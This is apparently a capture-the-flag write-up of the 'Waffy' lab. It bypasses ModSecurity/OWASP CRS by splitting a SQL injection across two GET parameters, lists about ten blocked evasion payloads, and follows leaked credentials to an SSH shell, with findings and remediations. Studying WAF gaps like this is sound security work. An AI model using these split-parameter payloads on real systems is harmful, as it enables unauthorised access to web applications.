# 84 Waffy — writeup

**Lab:** `84|Waffy|dificil` — "Bypass del WAF Modsecurity instalado en Apache."
**IP:** `172.17.0.9` (single container, single bridge network; `auto_deploy.sh` read, not run).

---

## The answer first: did lab 218's rule survive a real ModSecurity?

**Partly — and the half that survived is the weaker half. The class row in `RUNBOOK.md` §5 needs correcting, not extending.**

Lab 218's rule has two clauses. Measured against ModSecurity 2.9.7 + OWASP CRS 4.18.0-dev:

| 218's clause | Verdict here | Evidence |
|---|---|---|
| *A blocklist names what you already know; the bypass is the unlisted encoding of the same syntax* | **Did not generalise as written.** Against libinjection there is no "unlisted encoding" to reach for. I tried the whole family — alternate comment syntax, mixed case, MySQL versioned comments `/*!…*/`, tab and newline separators, `#` instead of `--`, percent-encoded and double-percent-encoded quotes. **10 quote-bearing variants tested, 10 blocked, 0 successes** (V1–V7, W3–W5, N1–N3 below). | scores 13–18 against a threshold of 5 |
| *A filter that validates a string hands the shell a pattern* | **The shape survives; the mechanism does not.** There is no glob to hand ModSecurity, and no unfiltered string for it to mis-parse. What replaces it is the same *gap* in a different guise: **the WAF scores each variable independently, while the sink composes them into one.** That is why the bypass below works, and it is a finding about the engine's scoring model, not about cleverness with a token. | §Findings F1 |

**Why 218's rule was a toy-filter artefact, stated precisely.** Lab 218's filter was
`strpos()`/`preg_match()` over **one already-decoded PHP string**: no declared variable
set, no transformation pipeline, no scoring, one request field. ModSecurity matches a
**named list of variables** after a **declared pipeline**, then **sums an anomaly score**
against a threshold. Read off the artefact, rule 942100
(`REQUEST-942-APPLICATION-ATTACK-SQLI.conf:66`):

```
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|
        REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|XML:/* "@detectSQLi" \
    "id:942100, phase:2, block, ...,
    t:none,t:utf8toUnicode,t:urlDecodeUni,t:removeNulls, ...
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
```

So there is no "string after decoding" that can be *unlisted* — there is a **set of
variables** and a **threshold**. 218's rule was generalisable *about string blocklists*,
and this lab is not a string blocklist. That is the correction.

**And one 218 discriminator is refuted outright here.** 218 taught: *discriminate block
from wrong-payload by **body hash**.* Against a real engine that does not hold —
ModSecurity's block page is Apache's **stock, unbranded 403 document**, and it is **not
byte-stable**, because it embeds the `Host` it refused:

| Response | Status | Bytes | sha256 (16) |
|---|---|---|---|
| ModSecurity block, `Host: 172.17.0.9` | 403 | 275 | `1630ab41ca37e421` |
| **Same block, `Host: waffy.dl`** | 403 | **273** | **`f5fefd67ac851ba2`** |
| Apache's own 404 | 404 | 272 | `8572b00f4a99b589` |

Identical event, two different hashes. Body hash is only a discriminator if you hold
`Host` fixed. **The discriminator that actually worked in this lab was the `Location`
header** — see F5 and Instrumentation defect 3.

---

## Surface

```
$ nmap -sV -Pn -p- --open 172.17.0.9
Nmap scan report for 172.17.0.9
Host is up (0.000045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

**Stack and versions — from the artefact, not from memory:**

| Component | Version | Source |
|---|---|---|
| Apache httpd | 2.4.58 (Ubuntu) | `nmap -sV`; `error.log` `AH00163` |
| ModSecurity | **2.9.7** | `dpkg -l libapache2-mod-security2 2.9.7-1build3`; `error.log` `ModSecurity for Apache/2.9.7 … configured.` |
| OWASP CRS | **4.18.0-dev** (package `modsecurity-crs 3.3.5-2`) | every rule's `ver:'OWASP_CRS/4.18.0-dev'`; `error.log` |
| PHP | 8.3.6 (`libapache2-mod-php8.3 2:8.3+93ubuntu2`) | `mods-enabled/php8.3.load` |
| MariaDB | 10.11.13, `utf8mb4` | `SELECT @@version, @@sql_mode, @@character_set_server` |
| OpenSSH | 9.6p1 | `nmap -sV` |

**Note the version disagreement, which is itself a fact:** the Debian package says CRS
`3.3.5`, every rule stamps `OWASP_CRS/4.18.0-dev`, and **two** CRS copies are on disk —
`/etc/modsecurity/coreruleset/` (Aug 2025, the one `Include`d) and
`/etc/modsecurity/crs/` (Oct 2023, **not** included). The older tree is dead weight that
an operator editing "the CRS" would plausibly edit in the wrong place.

**What a TCP scan cannot see — measured, not assumed.** `nmap -p-` is TCP by definition.

| Check | Result | Work count |
|---|---|---|
| `/proc/net/udp` | **0 data rows** (header only) | file read in full |
| `/proc/net/udp6` | **0 data rows** | file read in full |
| `docker inspect .Config.ExposedPorts` | `null` | — |
| **`ss -tlnp`** | **`127.0.0.1:3306` MariaDB — loopback-only, and `closed` to `-p-`** | full listener table read |

MariaDB is the database behind the only sink and it is not on the wire at all. A TCP scan
cannot show it; `ss` inside the container can. Negative carries its work count.

**PID 1** is `/bin/sh -c service ssh start && service apache2 start && service mariadb start && tail -f /dev/null`
— no systemd, no journal. Relevant only as a caution: any log-file-scraping control here
would face the same dead backend lab 218 documented for fail2ban.

---

## The class

**Entry criterion (RUNBOOK §5, the question that started it):** *Does the filter read the
request, or the string after decoding?*

**Source that settled it:** the rule set is not in application code at all. It is
`/etc/apache2/mods-available/security2.conf:1-7` plus
`/etc/modsecurity/coreruleset/rules/*.conf` (47 files).

### The rule set, read from the artefact

**Enforcement point — Apache module, in-process, not a reverse proxy, not the application:**

| Question | Answer | Evidence |
|---|---|---|
| Module or proxy? | **Apache module.** `mods-enabled/security2.load` → `LoadModule security2_module /usr/lib/apache2/modules/mod_security2.so` (935544 bytes) | read directly |
| Is it a reverse proxy? | **No.** All 37 `Proxy` matches in `/etc/apache2/` are `ProxyHTMLLinks`/`ProxyHTMLEvents` (mod_proxy_html link rewriting) and `ProxyStatus On`. **Zero `ProxyPass`.** | grepped, comments excluded |
| Who owns :80? | `apache2` pid 34 directly — no upstream | `ss -tlnp` |
| Same process as PHP? | **Yes** — `mpm_prefork`, pid 34 root + pid 39 www-data, both `apache2` | `ps` |

**`SecRuleEngine` — enforcing, not `DetectionOnly`, and it is a first-class fact:**

```
/etc/apache2/sites-available/000-default.conf
1  <VirtualHost *:80>
4          DocumentRoot /var/www/html
8          <IfModule security2_module>
9              SecRuleEngine On
10         </IfModule>
11 </VirtualHost>
```

`SecRuleEngine On` appears **exactly once in the entire Apache tree** (grepped
`/etc/apache2/`, 2 hits, the other being `000-default.conf.dpkg-old`). Enforcing is
**measured, not read**: rule `949110` (`REQUEST-949-BLOCKING-EVALUATION.conf:226-233`) is
`deny` in `phase:2`, and it fires — `Access denied with code 403 (phase 2)`.

**⚠️ `SecRuleEngine On` is inside the `<VirtualHost>`, not at server scope.** ModSecurity's
default is `Off`. The measured config fact: the directive exists once, vhost-scoped, and
nowhere at server level. *Inferred consequence (flagged as inference, not measured):* any
vhost added to this image later would have the module and all 47 rule files loaded and the
engine **off**, i.e. a silent total bypass. I could not demonstrate it — `sites-enabled/`
contains only `000-default.conf`, so there is no second vhost to test. Not claimed.

**Paranoia level: 1.** First-class, and it changes everything. `crs-setup.conf` leaves
every paranoia directive commented out; the default is set by the rule itself at
`REQUEST-901-INITIALIZATION.conf:116-123` (`setvar:'tx.blocking_paranoia_level=1'`), and
`:126-133` copies it into `detection_paranoia_level`. Independently confirmed by every
score line the engine emits: `per_pl=1-0-0-0`. PL2+ rules exist in the tree and **do not
run**.

**Scoring model, from `crs-setup.conf` — all three defaults are commented out, so the CRS
built-ins apply:**

| Line | Directive | Effective value |
|---|---|---|
| `crs-setup.conf:274` | `# setvar:tx.critical_anomaly_score=5` | **5** |
| `crs-setup.conf:276` | `# setvar:tx.warning_anomaly_score=3` | **3** |
| `crs-setup.conf:328` | `# setvar:tx.inbound_anomaly_score_threshold=5` | **5** |
| `crs-setup.conf:97-98` | `SecDefaultAction "phase:1,…,pass"` / `"phase:2,…,pass"` | rules **log and pass**; only `949110` denies |

### `SecRequestBodyAccess` — Off, and I measured it rather than assuming it

**No `modsecurity.conf` is included anywhere.** `security2.conf` is only 7 lines
(`SecDataDir` + two `IncludeOptional` for the CRS); it never pulls in
`modsecurity.conf-recommended`, and `/etc/modsecurity/modsecurity.conf` **does not exist**.
So `SecRequestBodyAccess` is unset and defaults to **Off**.

Proven with a differential, because "unset" is not the same as "the body is not read":

| Probe | Payload | Status | Rules fired | `COMBINED_SCORE` |
|---|---|---|---|---|
| B1 **GET** | `' or 1=1-- -` in the query string | **403** | `920350, 942100, 949110, 980170` | **8** |
| B2 **POST** form-encoded | the *byte-identical* string in the body | 200 | `920350, 980170` | **3** (baseline only) |
| B3 **POST** JSON | same string as a JSON value | 200 | `920350, 980170` | **3** (baseline only) |

**942100 is absent from both POST slices and present in the GET slice.** The same bytes,
the same engine, the same rule language — **+5 in the query string, 0 in the body.** That
is the work count that makes this a finding rather than an absence: without it, "no rule
fired" would be indistinguishable from "no rule looked".

**This is not exploitable in this lab, and that is a separate finding (F3).** The sink
reads `$_GET` only (`index.php:122-123`), so a POST body never reaches the SQL — B2's 200
is the *untouched login page*, sha `26a69b2846a52372`, byte-identical to a plain `GET
/index.php`. **A 200 that renders the login page proves nothing** and is recorded as such.

### What a ModSecurity block actually looks like

The literal body, in full:

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at 172.17.0.9 Port 80</address>
</body></html>
```

Headers: `HTTP/1.1 403 Forbidden`, `Server: Apache/2.4.58 (Ubuntu)`, `Content-Length: 275`,
`Content-Type: text/html; charset=iso-8859-1`. **No rule ID. No anomaly score. No
`Server: ModSecurity`. No vendor fingerprint whatsoever.**

**So: can a ModSecurity block be told apart from an application 4xx?**

- **Against another Apache-generated error: yes, but only by text and byte count** — 275 B
  vs Apache's 404 at 272 B, different `h1`/`p`. Fragile, and *not* stable across `Host`
  values (273 B with `Host: waffy.dl`).
- **Against an application 4xx: the question is empty here, and that is the real answer.**
  This application **never emits a 403.** Its failure modes are `200` (login form),
  `302 → /index.php` (wrong credentials, `index.php:140`) and `200` (the PDOException
  message, `index.php:135-138`). So a 403 *is* attributable in this lab — **not because
  the body is branded, but because I enumerated the app's own status set and 403 is not in
  it.** Attributability came from reading the application, not from the WAF's fingerprint.

**Enforcement happens before the application runs — measured, not inferred:**

| Request | `Set-Cookie` headers |
|---|---|
| blocked (`' or 1=1-- -`) | **0** |
| allowed (`name=abc&password=abc`) | **1** — `PHPSESSID=fdqha29…` |

`index.php:102` calls `session_start()` on every request, so a pass *always* emits a
session cookie. A block emitting **zero** cookies proves `mod_php` never executed: the
deny happens in the Apache fixup phase, ahead of the content handler. That is the
signature of an in-process module filter, and it is the observable that distinguishes
"blocked by the WAF" from "reached the app and the app refused".

### The bypass class: rule-based, not transformation-based

**The `ARGS` list in 942100 is the attack surface, and it is finite and named.** A
transformation bypass would be a payload that survives `t:none,t:utf8toUnicode,
t:urlDecodeUni,t:removeNulls` and evades the signature. I could not build one (10
variants, 10 blocks). The bypass that works is **rule-based**: the payload is split across
**two variables the engine scores separately**, and MySQL's string-literal continuation
reassembles them.

**First, prove the normalisation step rather than assume it** (three spellings of the same
payload, same score, same hash — so the engine decoded all of them to the same value):

| Probe | Spelling on the wire | Status | sha256 (16) | `942100` | Score |
|---|---|---|---|---|---|
| N1 | `' or 1=1-- -` (raw) | 403 | `f5fefd67ac851ba2` | fired | 5 |
| N2 | `%27%20or%201%3D1--%20-` | 403 | `f5fefd67ac851ba2` | fired | 5 |
| N3 | `%2527%2520or%25201%253D1--%2520-` (**double**-encoded) | 403 | `f5fefd67ac851ba2` | fired | 5 |

N3 is the informative one. `t:urlDecodeUni` is applied to a value ModSecurity has already
percent-decoded once, so the engine ends up **decoding twice** and sees `' or 1=1-- -`,
while PHP's `$_GET` decodes **once** and would have received the literal text
`%27%20or%201%3D1--%20-`. **ModSecurity over-normalises relative to the application** —
it decodes *deeper* than the sink does, so it is stricter than the app, not looser. This
is the opposite direction from the usual parser differential and worth stating: a
double-encoded payload is caught *because* the WAF decodes more than the app, which is
why "just double-encode it" fails here.

**Then, the discriminator that produced the bypass** — the two arguments scored in
isolation, against the same live engine:

| Probe | `name` | `password` | Rules fired | Score | Verdict |
|---|---|---|---|---|---|
| W1 | `\` | `x` | `920350, 980170` | **3** (baseline) | backslash alone is invisible |
| W2 | `x` | `OR 1=1-- -` | `920350, 980170` | **3** (baseline) | tautology alone is invisible |
| W3 | `\` | `UNION SELECT 1,0x…444c38344d41524b,2-- -` | `+942100, 942190` | **13** | `UNION SELECT` is the trigger |
| W4 | `\` | `UNION SELECT 1,'DL84MARK',2-- -` | `+942100, 942190` | **13** | not the quotes |
| W5 | `\` | `UNION SELECT 1,0x…444c38344d41524b,2#` | `+942100, 942190` | **13** | not the comment style |

**Both halves of the injection are individually worth zero points. The moment they are
combined into a single parameter, `UNION SELECT` lights up both `942100` (libinjection)
and `942190` (generic regex) for +10.** So the WAF's blind spot is not lexical, it is
**compositional** — and that is precisely why the payload must never be assembled in one
variable.

**The source-read fact that made it work, and it was a prediction before it was a test:**
`SELECT @@sql_mode` returns `STRICT_TRANS_TABLES, ERROR_FOR_DIVISION_BY_ZERO,
NO_AUTO_CREATE_USER, NO_ENGINE_SUBSTITUTION`. **`NO_BACKSLASH_ESCAPES` is absent**, so
MySQL honours backslash escapes — a backslash inside a string literal escapes the closing
quote. Everything else in the exploit follows from that one line of configuration.

---

## Chain

The sink, read before any request was sent:

```php
/var/www/html/index.php
121     // Recogemos desde GET
122     $username = $_GET['name'];
123     $password = $_GET['password'];
124
125     // VULNERABILIDAD: Consulta SQL concatenada directamente con entrada de usuario
126     $consult = "SELECT * FROM users WHERE username = '$username' AND passwd = '$password'";
127     $send = $conet->query($consult);
```

```sql
-- with name = \   and   password = OR 0x444c…=0x444c…-- -
SELECT * FROM users WHERE username = '\' AND passwd = 'OR 0x444c…=0x444c…-- -'
                                                                        ↑
                                          the \' does not close the literal
```

MySQL parses `'\' AND passwd = '` as **one** string literal (the backslash escapes the
quote), then evaluates `OR 0x…=0x…` as a predicate, then `-- -` comments out the trailing
`'`. ModSecurity scored `\` and `OR 0x…=0x…-- -` as two unrelated strings.

| # | → | Mechanism | Identity proof |
|---|--|-----------|----------------|
| 1 | `www-data` uid 33 | `index.php:126` — `$conet->query()` reached with the two halves carried in `name` and `password`. No rule fired: `newlog=0`. | **Not** inferred from a 200. The session value the sink wrote is the DB's own `username` column — see hop 2. |
| 2 | `www-data` uid 33 | `$_SESSION['user'] = $row["username"]` (`index.php:131`) → auth granted | `admin.php:87` renders **`¡Bienvenido, balutin!`** — `balutin` is a **database value**, not anything I supplied. A supplied password of `OR 0x…=0x…-- -` matches no stored row, so a returned row is only possible if the SQL was restructured. **The sink proved its own execution.** |
| 3 | `baluton` uid 1000 | SSH with the credentials the admin panel hands out (`admin.php:90-91`) | `id` → `uid=1000(baluton) gid=1000(baluton) groups=1000(baluton)`; `id -u` → `1000`; `id -un` → `baluton`; `whoami` → `baluton` — four ways, not inferred from a successful login |

**Root was not reached and is not claimed.** `ls -la /root` → `Permission denied`;
`/opt` and `/srv` are empty; no `sudoers` line, SUID sweep or capability test was run
(explicitly NOT tested, below).

### The positive control, and why it is a control

**A marked oracle, because a 302 that redirects proves nothing.** `OR 0x<TOKEN>=0x<TOKEN>`
carries a per-engagement random token (`DL84AF3C91B7E2` →
`0x444c383441463343393142374532`) as a *conditional*: the login can only succeed if the
engine evaluated that exact hex comparison and found it true. Paired with a negative that
differs in **one hex digit**:

| Request | `password` | `Location` | Interpretation |
|---|---|---|---|
| **X1 positive** | `OR 0x444c…4532=0x444c…4532-- -` | **`/admin.php`** | injection executed, row returned, session set |
| **X2 negative** | `OR 0x444c…4532=0x444c…4533-- -` | **`/index.php`** | comparison false → no row → login refused |

Identical shape, identical status, identical body — **one hex digit apart, opposite
outcomes.** That is the differential, and it is what makes X1 a result rather than a
coincidence.

**The engine-liveness control — the one that keeps this honest.** "0 rules fired" is
indistinguishable from "nothing looked", so I proved the engine was reading *that exact
request* by adding a third parameter that must fire:

| Probe | `zzzprobe` | Rules fired | What the log says |
|---|---|---|---|
| N6 | `' or 1=1-- -` | `942100, 949110, 980170` | **`Matched Data: s&1c found within ARGS:zzzprobe: ' or 1=1-- -"`** |
| N7 | `harmless` | none | — |

The log names **`ARGS:zzzprobe`** and *only* `ARGS:zzzprobe`. So on that identical request
line the engine was alive, was scoring the arguments, and found **nothing in `name` or
`password`**. The bypass scores a **true zero**, not an untested zero.

**And the negative that justifies the whole exercise** — a single-parameter payload cannot
get through. **10 quote-bearing variants tested, 10 blocked at 403, 0 successes:**

| # | Payload in `name` | Score | Rule IDs |
|---|---|---|---|
| V1 | `' UNION SELECT '…'-- -` | 18 | `942100, 942190, 942360, 949110` |
| V2 | `'/**/UNION/**/SELECT/**/'…'-- -` | 13 | `942100, 942190, 949110` |
| V3 | `' uNiOn sElEcT '…'-- -` | 18 | `942100, 942190, 942360, 949110` |
| V4 | `'/*!UNION*/ /*!SELECT*/ '…'-- -` | 18 | `942100, 942190, 942500, 949110` |
| V5 | tab-separated | 18 | `942100, 942190, 942360, 949110` |
| V6 | newline-separated | 18 | `942100, 942190, 942360, 949110` |
| V7 | `#` instead of `--` | 18 | `942100, 942190, 942360, 949110` |
| W3/W4/W5 | `\` + `UNION SELECT …` in `password` | 13 | `942100, 942190, 949110` |
| N1/N2/N3 | `' or 1=1-- -`, raw / encoded / double-encoded | 5 | `942100, 949110` |

**Threshold 5, and the best single-parameter attempt reached 5.** libinjection at PL1 is
strong. The working bypass needed **two** parameters.

---

## Findings

### F1 — Authentication bypass: SQL injection split across two independently-scored WAF variables (CWE-89)

`index.php:126` concatenates **two** untrusted `$_GET` values into **one** SQL string
literal. OWASP CRS scores each `ARGS` entry **separately** and sums the result, so a
payload whose halves are individually benign is scored **0** while the database reassembles
it into executable SQL.

- **Evidence:** `name=\` + `password=OR 0x444c…=0x444c…-- -` → `302 Location: /admin.php`,
  **`newlog=0`** (no CRS rule fired, no anomaly score), then `admin.php` →
  `200 ¡Bienvenido, balutin!`.
- **Root cause, two layers, and they must be reported separately:**
  1. **Application (the vulnerability).** String concatenation into SQL. A tautology in a
     single parameter is caught (10/10 blocked) — the flaw is that there are *two*
     adjacent injection points sharing one literal, and the fix is PDO bound parameters,
     which removes the class entirely.
  2. **WAF (the detection gap, and it is a gap in the *model*, not a bug in ModSecurity).**
     Anomaly scoring is **compositional-blind**: it sums per-variable scores and has no
     notion of a value that is only dangerous in combination. **This is not a ModSecurity
     vulnerability and must not be reported as one.** It is the correct, expected behaviour
     of a per-variable scoring engine, and the honest framing is: *a WAF of this class
     cannot be the control for a sink that composes its inputs.* The only real control is
     the sink's own parameterisation.
- **Remediation:** `index.php:126` → prepared statement with bound parameters. Do **not**
  attempt to close this by adding CRS rules; there is no rule that can see a value that
  does not exist in any single variable.

### F2 — `SecRuleEngine On` is scoped to a single `<VirtualHost>`, not to the server (CWE-1188 / misconfiguration)

`SecRuleEngine On` appears **once** in the whole Apache tree, at
`/etc/apache2/sites-available/000-default.conf:9`, nested inside `<VirtualHost *:80>`
inside `<IfModule security2_module>`. ModSecurity's default is `Off`. The module and all
47 rule files load globally; **the switch that makes them run is per-vhost.**

- **Measured:** the directive's location and uniqueness (grep over `/etc/apache2/`).
- **Inferred, flagged as inference:** a second vhost added to this image would run with
  the engine **off** and the full CRS loaded but inert. **Not demonstrated** —
  `sites-enabled/` contains only `000-default.conf`, so there was nothing to test against.
  Stated as a configuration risk, not a proven bypass.
- **Remediation:** set `SecRuleEngine` at server scope (`apache2.conf` or a
  `conf-enabled` file), not in a vhost.

### F3 — `SecRequestBodyAccess` is Off: the CRS cannot see request bodies (CWE-693, protection-mechanism failure)

`mods-available/security2.conf:1-7` never includes `modsecurity.conf-recommended`, and
`/etc/modsecurity/modsecurity.conf` **does not exist**. Body access therefore defaults to
**Off**, and `SecAuditEngine`, `SecDebugLog` and the JSON rules `200001`/`200006` are
likewise absent.

- **Evidence (the differential, with work counts):** the byte-identical string
  `' or 1=1-- -` scores **+5 via `942100` in a query string** and **0 in a POST body**
  (B1 vs B2/B3). `942100` is simply absent from the POST log slices.
- **Impact — and the honest limit of it:** every CRS rule whose target list includes
  `REQUEST_BODY` is inert, which is most of `REQUEST-932/933/934/941/942`. **In this lab
  it is not exploitable**, because the only sink reads `$_GET` (`index.php:122-123`) and a
  POST body never reaches it — B2's `200` was the untouched login form (sha
  `26a69b2846a52372`, identical to a bare `GET /index.php`), which is why it is recorded
  as a 200 that proves nothing. **Reported as a live misconfiguration whose exploitability
  is currently masked by the application's own parameter choice.** A one-line change to
  `$_REQUEST` in the application would turn it into a complete WAF bypass.
- **Remediation:** install and include `modsecurity.conf-recommended`, and set
  `SecRequestBodyAccess On`, `SecAuditEngine RelevantOnly` with a real `SecAuditLog`.

### F4 — DB credentials in the docroot (CWE-312)

`/var/www/html/config.php:1-13` returns the MariaDB DSN, user `phpuser`, password `paso`,
database `register`, and is world-readable (`-rw-r--r-- www-data www-data`). It sits in
the served document root, so it is retrievable as `GET /config.php` — although, measured,
the PHP extension executes it and returns an **empty body** rather than its source, so it
is exposed to local readers and to any future `.php`-source-disclosure bug, not directly
over HTTP today. The credential is also trivially weak and is a `phpuser` DB account, not
a web credential. The SSH credential handed out by the admin panel (`admin.php:90-91`) is
the same string as the **database** row's password (`balutin` / `balulerobalulon`) —
**credential reuse across two tiers.**

### F5 — Login outcome is signalled only by the `Location` header (application design defect, and a reporting hazard)

`index.php:140` issues `header($forward); exit;` with either `/index.php` or
`/admin.php`. **Both outcomes are `302` with a byte-identical 3109-byte body**
(sha `6fb6adb3330e847e`). Success and failure are distinguishable **only** by the
`Location` header or by following the redirect.

This is filed as a finding because it is a live measurement hazard, demonstrated with
numbers in Instrumentation defect 3: a status-code-only or body-hash-only check scores a
**failed login as a success**. Any automated check against this app must assert on
`Location` or on the admin page's content, never on status.

### F6 — Reflected DOM XSS in `prueba.html` (CWE-79) — found, not used

`/var/www/html/prueba.html` reflects the `q` parameter into the page with **no
sanitisation**, client-side: `URLSearchParams.get('q')` → `document.write(query)`.

- **The sink is client-side, not server-side.** The reflection happens in the victim's
  browser via JavaScript, so it is a DOM-based XSS and **ModSecurity is structurally
  incapable of defending it** — the malicious value never appears in a server-rendered
  response, and CRS response-body rules (which would need `SecResponseBodyAccess`, also
  unset) do not apply to a `document.write` that the server never sees.
- Reported as an independent finding. It is **not** part of the WAF-bypass chain and was
  not used to obtain the reward — the chain in §Chain is SQLi → session → SSH, and nothing
  in it depends on XSS. Kept separate deliberately: merging them would imply the XSS
  contributed to the compromise, and it did not.

---

## Controls that held

| Control | Positive control that proves this detector works |
|---|---|
| **OWASP CRS PL1 SQLi detection (`942100`, libinjection)** | **Fired on 10/10** quote-bearing variants, plus the author's own probes preserved in the shipped `error.log` (Aug 23 2025: `detected SQLi using libinjection with fingerprint 's&1c'`, `ARGS:name: ' or 1=1-- -`). It also fired on my `zzzprobe` control (N6) *on the same request line as the bypass*, which is what proves it was live and looking. **A control that fired on every attempt I made against it, including after I found the bypass.** |
| **Generic SQLi regex (`942190`)** | Fired alongside `942100` on all 6 `UNION SELECT` variants (V1, V3–V7, W3–W5), each +5. Independent detector, independently proven. |
| **Anomaly threshold enforcement (`949110`)** | `Access denied with code 403 (phase 2)` observed on 13 distinct blocked requests, with `Operator GE matched 5 at TX:blocking_inbound_anomaly_score` in the log. Fires at exactly 5 (N1) and at 13 and 18. |
| **Block happens before the application** | Blocked request → **0** `Set-Cookie`; allowed request → `PHPSESSID` present. Since `index.php:102` always calls `session_start()`, a pass always sets a cookie. |
| **`admin.php` session guard (`admin.php:5-8`)** | **Three independent refusals, all → `Location: /index.php`:** no cookie at all; the **X2 mismatched-token session**; and post-restore. The guard is real and it is the only thing standing between an unauthenticated request and the SSH credentials at `admin.php:90-91`. It held every time. |
| **`PDO::ERRMODE_EXCEPTION` (`config.php:9`)** | Fires as designed — a malformed query surfaces the PDO message through `index.php:135-138` rather than a silent empty result. This is a *robustness* control that happened to be an information-disclosure aid; noted both ways. |
| **No second vhost, no `ProxyPass`, no root shell** | `sites-enabled/` = 1 file; `ProxyPass` = 0 occurrences; SSH lands at `uid=1000(baluton)`, and `ls -la /root` → `Permission denied`. The engagement stayed inside one host and one unprivileged identity after the web hop. |

---

## NOT tested vs discarded with reason

**NOT tested — no conclusion is claimed either way:**

- **Any privilege escalation from `baluton` (uid 1000) to root.** Not attempted. `/root`
  is unreadable; `/opt` and `/srv` are empty; **no `sudo -l`, no SUID sweep, no
  capability check was run.** The author's own `.bash_history` (readable, 64 bytes) shows
  they *tried* `sudo -l` and `find / -perm -4000` — so an escalation surface was
  plausibly in scope for the lab author, and it is **explicitly untested, not cleared.**
  Per corpus defect 1, any future `find -writable` sweep here must use a working
  substitute.
- **The F2 inference** (a second vhost would run with the engine off) is unproven — there
  was no second vhost to test against.
- **`REQUEST-942` and the other PL2–4 rule files** were confirmed present and confirmed
  inert (`per_pl=1-0-0-0`). Whether PL2 would have caught the F1 bypass was **not
  tested** — raising the paranoia level would have modified the lab, and the finding is
  reported at the level the lab ships.
- **UDP beyond the two `/proc/net/udp{,6}` files** (both 0 data rows) and
  `ExposedPorts = null`.
- **Whether the `t:removeNulls` transformation in 942100 is individually exploitable**
  (a `%00` truncation attack). Observed in the pipeline, not tested.
- **Any second SQL sink.** `grep` over `/var/www/html` found one query, at
  `index.php:126`. The DB holds one table, one row.

**Discarded with reason:**

| Discarded | Reason |
|---|---|
| **Double-URL-encoding the payload** (`%2527…`) — the textbook bypass | **403**, `942100` fired, score 5. Reason, measured (N1/N2/N3): ModSecurity applies `t:urlDecodeUni` to a value it has *already* decoded, so it decodes **twice** while PHP decodes once. The WAF is *stricter* than the app, so double-encoding makes detection **more** likely, not less. This is the opposite of the usual parser differential and is why the classic trick fails. |
| `/*!UNION*/ /*!SELECT*/` MySQL versioned comments | 403, score 18 — `942100` + `942190` + `942500`. MySQL executes versioned comments; libinjection sees through them. |
| `/**/` comment separation, mixed case, tab/newline separators, `#` comments | 403, scores 13–18. Four independent lexical evasions; none moved the score below the threshold. |
| `UNION SELECT …` with a quoted marker **or** a hex marker, `#` **or** `--` | All 403 at 13. The trigger is `UNION SELECT` itself, not the quoting or the comment style. |
| **Bypassing via POST** (the `SecRequestBodyAccess Off` gap, F3) | 200 — **but a 200 that proves nothing**: byte-identical to the bare login form, because the sink reads `$_GET`. Kept as a separate finding (F3) with its exploitability explicitly limited, rather than reported as a bypass. |
| `name=\' ` as the "one character apart" liveness control (N5) | **My control failed** — adding a `'` to `name` produced 0 log lines, because `\'` alone is not a detectable SQLi pattern. A control that never fires is not a control. **Discarded and replaced** with the `zzzprobe` third-parameter design (N6/N7), which fired. This is instrumentation defect 4. |
| The XSS in `prueba.html` as part of the chain | Client-side sink; contributes nothing to a server-side SQLi→SSH chain. Reported separately as F6, deliberately not merged into the chain. |
| `find / -iname '*flag*'` as the reward search | Found only `/var/lib/mysql/debian-10.11.flag` — a MariaDB packaging artefact, not a reward. Superseded by the full `FLAG{` sweep below. |

---

## Instrumentation defects

**1. `docker exec <c> < file` evaluates the redirect on the HOST, not in the container.**
My log-slice harness used `before=$(docker exec waffy_container wc -l < /var/log/…/error.log)`
to record a line offset. The `<` is parsed by the *host* shell, which produced
`No such file or directory` on **stderr**, while the command still returned an empty
string. Every probe then reported `loglines=0`.

**Cost: the first four probes of the `SecRequestBodyAccess` test silently reported "no
rules fired" for a payload I already knew fires.** That is defect 10 in its purest form —
a zero count that meant *the instrument never ran*, not *the engine never spoke*. Had I
believed it, the single most important finding in the lab (F3) would have been inverted
into "the CRS does not detect SQLi at all". Fixed with
`docker exec <c> sh -c 'wc -l < file'`, after which the offsets were real and B1 showed
`942100` firing exactly as expected. **The catch: the same run also produced a 403 on B1,
and a 403 alone does not tell you which half of the pipeline lied.** Only re-running with
a fixed instrument did.

**2. The first four baseline probes returned `000` / 0 bytes, and I refused to file that as
a result.** A batch of four `probe.sh` calls — the very first HTTP requests of the
engagement — all came back `000`, zero bytes, empty hash. The obvious reading is
"connection refused, service down, no surface". The actual cause was the harness, not the
target: invoking it through a variable-expanded path in the same shell invocation that
created it failed, while `./probe.sh` worked immediately. nmap had already shown 80/tcp
open and a subsequent `curl -sv` returned `200` in 0.02 s. **Re-run, not reinterpreted.**

**3. `rtk curl` produced no output and exit 0.** `rtk curl -sv http://172.17.0.9/ -o /dev/null`
printed **nothing at all** and exited 0 — a silent, successful-looking invocation. Plain
`curl -sv` immediately returned the full `200` with headers. The wrapper is on the PATH and
is the natural thing to type; every surprising result in this engagement was therefore
re-run through plain `curl` before being believed. *(Corpus defect 5, confirmed again:
a wrapper that drops output is indistinguishable from a request that returned nothing.)*

**4. My own liveness control was badly designed and I caught it — this is the one worth
keeping.** To prove the engine was alive during the bypass, I sent the bypass with **one
extra character** (`name` = `\'` instead of `\`). Both requests produced **0 log lines**.
Taken at face value that would have been read as "the engine is dead, so the bypass proves
nothing" — or, worse, as "the bypass worked because ModSecurity was off", which would have
been a completely wrong finding about a WAF that is demonstrably enforcing.

The reason the control failed is that `\'` on its own is not a detectable SQLi pattern:
libinjection correctly treats an escaped quote as data. **A control must be built from a
condition you have already seen succeed**, not from a payload that merely looks more
alarming. Replaced with the `zzzprobe` design: same request, plus a third parameter
carrying `' or 1=1-- -`, a payload *proven* to fire 10 times in this very engagement. It
fired, and the log named `ARGS:zzzprobe` **only** — which simultaneously proved the engine
was live *and* that `name`/`password` scored zero. **The replacement was better than the
